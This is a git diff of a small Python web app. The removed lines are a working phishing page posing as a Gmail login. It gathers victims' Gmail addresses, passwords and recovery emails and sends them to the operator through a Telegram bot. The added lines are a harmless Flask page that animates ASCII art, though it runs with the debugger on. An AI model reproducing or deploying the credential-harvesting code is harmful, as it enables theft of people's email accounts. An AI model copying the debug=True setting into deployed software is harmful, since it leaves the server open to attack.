@@ -1,73 +1,72 @@
-from quart import Quart, render_template, redirect, url_for
-from quart_wtf import QuartForm
-from wtforms import StringField, PasswordField, SubmitField
-from wtforms.validators import DataRequired, Email
-from aiogram import Bot
-import asyncio
-import os
-import logging
+from flask import Flask, render_template_string
+import time
 
-# Настройка логирования
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+app = Flask(__name__)
 
-# Инициализация Quart
-app = Quart(__name__)
-app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "your-secret-key")
+# Пример ASCII-арта
+ascii_art = """
+▓▓▓▓▓▓▓▓▓▓▓▓████████████
+▓▓▓▓▓▓▓▓███████▒▒▒▒▒▒▒▒▒███
+▓▓▓▓▓█████████▒▒▒▒▒▒▒▒▒▒▒▒████
+▓▓▓▓██▒███▒▒▒▒██▒▒▒▒▒▒▒▒▒█▒▒▒██
+▓▓▓█▒▒▒█▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒█▒▒▒▒▒▒██
+▓▓█▒▒▒█▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒██
+▓█▒▒▒██▒▒▒▒▒▒▒▒▒█████████▒▒▒▒▒▒▒▒█
+██▒▒▒█▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒█
+█▒▒▒██▒▒▒▒▒▒▒▒████████████▒▒▒▒▒▒▒▒█
+█▒▒█████▒▒▒███▒▒▒███████▒▒████▒▒▒██
+███████████▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒█████
+█▒███████▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒████
+█▒███████▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒████
+▓█▒██████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒███
+▓▓█▒██▒▒██▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒██▒██
+▓▓▓██▒▒▒▒▒███▒▒▒▒█████▒▒▒▒███▒▒▒█
+▓▓▓▓██▒▒▒▒▒▒███████████████▒▒▒██
+▓▓▓▓▓███▒▒▒▒▒▒██████████▒▒▒▒██
+▓▓▓▓▓▓▓████▒▒▒█████████▒▒███
+▓▓▓▓▓▓▓▓▓▓█████▒▒▒▒▒▒████
 
-# Токен Telegram-бота и CHAT_ID из переменных окружения
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+"""
 
-# Инициализация Telegram-бота
-telegram_bot = Bot(token=TELEGRAM_TOKEN)
+# Главная страница с эффектом печати
+@app.route('/')
+def home():
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ASCII-арт с эффектом печати</title>
+        <style>
+            body {
+                background-color: black;
+                color: green;
+                font-family: monospace;
+                white-space: pre;
+            }
+        </style>
+    </head>
+    <body>
+        <pre id="ascii">{{ ascii_art }}</pre>
+        <script>
+            const asciiElement = document.getElementById("ascii");
+            const asciiArt = `{{ ascii_art }}`;
+            let index = 0;
 
-# Асинхронная функция для отправки сообщения в Telegram
-async def send_telegram_message(text):
-    try:
-        await telegram_bot.send_message(chat_id=CHAT_ID, text=text)
-        logger.info(f"Message sent to Telegram: {text}")
-    except Exception as e:
-        logger.error(f"Failed to send message to Telegram: {e}")
+            function typeEffect() {
+                if (index < asciiArt.length) {
+                    asciiElement.innerHTML += asciiArt[index];
+                    index++;
+                    setTimeout(typeEffect, 50); // Скорость печати (мс)
+                }
+            }
 
-# Определение формы
-class LoginForm(QuartForm):
-    gmail = StringField('Your Gmail account', 
-                        validators=[DataRequired(), Email()], 
-                        render_kw={"placeholder": "Your Gmail account", "type": "email"})
-    password = PasswordField('Password gmail.com', 
-                            validators=[DataRequired()], 
-                            render_kw={"placeholder": "Password gmail.com", "type": "password"})
-    recovery_email = StringField('Secondary email recovery', 
-                                validators=[DataRequired()], 
-                                render_kw={"placeholder": "Secondary email recovery", "type": "text"})
-    submit = SubmitField('login')
-
-# Маршрут для формы
-@app.route('/', methods=['GET', 'POST'])
-async def show_form():
-    form = await LoginForm.create_form()
-    if await form.validate_on_submit():
-        gmail = form.gmail.data
-        password = form.password.data
-        recovery_email = form.recovery_email.data
-        
-        if not gmail.endswith('@gmail.com'):
-            return await render_template('form.html', form=form, error="Please use a Gmail address")
-        
-        # Формируем сообщение для Telegram
-        message = f"\n{gmail}:{password}:{recovery_email}"
-        
-        # Отправляем сообщение в Telegram
-        await send_telegram_message(message)
-        
-        return await render_template('success.html', 
-                                   gmail=gmail, 
-                                   password=password, 
-                                   recovery_email=recovery_email)
-    
-    return await render_template('form.html', form=form)
+            typeEffect();
+        </script>
+    </body>
+    </html>
+    ''', ascii_art=ascii_art)
 
 if __name__ == '__main__':
-    port = int(os.getenv("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(debug=True)
